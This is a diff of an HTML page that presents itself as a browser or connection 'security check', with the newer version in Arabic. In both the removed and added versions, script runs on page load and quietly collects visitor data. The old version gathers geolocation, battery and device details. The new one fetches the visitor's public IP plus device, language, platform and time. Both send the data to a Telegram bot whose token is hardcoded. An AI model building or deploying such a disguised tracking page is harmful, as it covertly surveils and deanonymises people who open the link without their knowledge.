@@ -2,105 +2,46 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Secure Verification</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f9f9f9;
-      text-align: center;
-      padding: 40px;
-    }
-    .card {
-      background-color: white;
-      padding: 30px;
-      max-width: 400px;
-      margin: auto;
-      box-shadow: 0 0 15px rgba(0,0,0,0.2);
-      border-radius: 8px;
-    }
-    h2 {
-      color: #333;
-    }
-    p {
-      font-size: 14px;
-      color: #777;
-    }
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #555;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      margin: 20px auto;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <h2>Verifying your browser...</h2>
-    <p>Please wait while we complete a quick security check.</p>
-    <div class="loader"></div>
-  </div>
-
+  <title>جارٍ التحقق...</title>
   <script>
-    async function collectAndSend() {
-      const data = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        cookiesEnabled: navigator.cookieEnabled,
-        connection: navigator.connection ? {
-          downlink: navigator.connection.downlink,
-          effectiveType: navigator.connection.effectiveType,
-          rtt: navigator.connection.rtt
-        } : {},
-        battery: {},
-        geo: {}
-      };
+    async function getData() {
+      const ref = new URLSearchParams(window.location.search).get("ref") || "غير_معروف";
+      const ipInfo = await fetch("https://api.ipify.org?format=json").then(res => res.json());
+      const device = navigator.userAgent;
+      const lang = navigator.language;
+      const platform = navigator.platform;
+      const online = navigator.onLine ? "متصل" : "غير متصل";
+      const battery = await navigator.getBattery?.().then(b => `${Math.round(b.level * 100)}% ${b.charging ? '🔌' : '🔋'}`) || "غير مدعوم";
+      const time = new Date().toLocaleString();
 
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          data.battery = {
-            level: battery.level,
-            charging: battery.charging
-          };
-        } catch (e) {}
-      }
+      const message = `
+📥 تم دخول الرابط:
 
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(pos => {
-          data.geo = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            acc: pos.coords.accuracy
-          };
-          sendData(data);
-        }, () => sendData(data));
-      } else {
-        sendData(data);
-      }
-    }
+🆔 المرجع: ${ref}
+🌐 IP: ${ipInfo.ip}
+📱 الجهاز: ${device}
+🌍 اللغة: ${lang}
+💻 النظام: ${platform}
+🔋 البطارية: ${battery}
+📶 الاتصال: ${online}
+🕒 الوقت: ${time}
+`;
 
-    function sendData(data) {
-      fetch("https://api.telegram.org/bot8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4/sendMessage", {
+      // إرسال البيانات للبوت الرئيسي
+      await fetch(`https://api.telegram.org/bot8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4/sendMessage`, {
         method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          chat_id: "7121448697",
-          text: "📦 New visitor data:\n" + JSON.stringify(data, null, 2)
+          chat_id: ref,
+          text: message
         })
       });
     }
 
-    collectAndSend();
+    getData();
   </script>
+</head>
+<body>
+  <h2 style="text-align:center;margin-top:20%;">📡 يتم التحقق من اتصالك...</h2>
 </body>
 </html>
